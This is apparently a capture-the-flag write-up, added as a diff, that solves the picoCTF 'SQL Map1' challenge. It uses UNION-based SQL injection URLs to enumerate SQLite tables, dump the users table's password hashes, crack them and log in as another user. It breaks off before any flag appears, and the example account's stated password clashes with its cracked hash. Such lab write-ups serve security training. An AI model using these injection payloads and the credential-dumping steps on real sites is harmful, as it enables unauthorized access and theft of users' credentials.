@@ -1,0 +1,132 @@
+SQL Map1 - Step by Step Solution
+Initial Reconnaissance
+
+    Access the website: http://lonely-island.picoctf.net:62247/
+
+    Register an account: Create any test account (e.g., username: hacker, password: hacker123)
+
+    Login with your test account
+
+Discovering the Vulnerability
+Step 1: Find the vulnerable parameter
+
+Notice there's a search functionality. The search parameter appears in the URL:
+text
+
+http://lonely-island.picoctf.net:62247/vuln.php?q=test
+
+Step 2: Test for SQL injection
+
+Try a basic UNION injection to find the number of columns:
+text
+
+http://lonely-island.picoctf.net:62247/vuln.php?q=test' UNION SELECT 1,2,3--&PHPSESSID=your_session_id
+
+Error received:
+text
+
+Warning: SQLite3::query(): Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns
+
+This tells us:
+
+    It's an SQLite database
+
+    The column count is wrong
+
+Step 3: Find correct column count
+
+Test different numbers of columns:
+text
+
+http://lonely-island.picoctf.net:62247/vuln.php?q=test' UNION SELECT 1--&PHPSESSID=your_session_id
+http://lonely-island.picoctf.net:62247/vuln.php?q=test' UNION SELECT 1,2--&PHPSESSID=your_session_id
+
+Success with 2 columns:
+text
+
+Results: 1: 2
+
+The original query returns 2 columns.
+Database Enumeration
+Step 4: List all tables
+
+Since it's SQLite, query the sqlite_master table:
+text
+
+http://lonely-island.picoctf.net:62247/vuln.php?q=test' UNION SELECT 1,name FROM sqlite_master WHERE type='table'--&PHPSESSID=your_session_id
+
+Results:
+text
+
+1: flags
+1: sqlite_sequence
+1: users
+
+Step 5: Check table structures
+
+For the flags table:
+text
+
+http://lonely-island.picoctf.net:62247/vuln.php?q=test' UNION SELECT 1,sql FROM sqlite_master WHERE name='flags'--&PHPSESSID=your_session_id
+
+Result:
+text
+
+1: CREATE TABLE flags ( id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT NOT NULL UNIQUE, value TEXT NOT NULL )
+
+For the users table:
+text
+
+http://lonely-island.picoctf.net:62247/vuln.php?q=test' UNION SELECT 1,sql FROM sqlite_master WHERE name='users'--&PHPSESSID=your_session_id
+
+Result:
+text
+
+1: CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL )
+
+Data Extraction
+Step 6: Dump user credentials
+text
+
+http://lonely-island.picoctf.net:62247/vuln.php?q=test' UNION SELECT username,password FROM users--&PHPSESSID=your_session_id
+
+Results (username:hash):
+text
+
+admin: 5a9a79d9fa477ed163b89088681672c9
+ctf-player: 7a67ab5872843b22b5e14511867c4e43
+ghost: 8d2379c40704bed972e55680be2355e2
+hacker: 202cb962ac59075b964b07152d234b70
+malicious: a669d60c31ad3d05b9e453c8576c7aab
+noaccess: 83806b490e28a7f8e6662646cbdbff1a
+suspicious: eb1f3ba6901c65d9b2e09a38f560758b
+
+Hash Cracking
+Step 7: Crack the hashes
+
+Go to CrackStation.net and enter the hashes:
+
+    7a67ab5872843b22b5e14511867c4e43 → dyesebel (ctf-player's password)
+
+    202cb962ac59075b964b07152d234b70 → 123 (hacker account)
+
+    Other hashes weren't found in the database
+
+Gaining Access
+Step 8: Login as ctf-player
+
+    Go to the login page
+
+    Enter username: ctf-player
+
+    Enter password: dyesebel
+
+    Click Login
+
+Step 9: Retrieve the flag
+
+After successful login, you're redirected to a protected area showing:
+text
+
+Protected area
+Logged in as: ctf-player
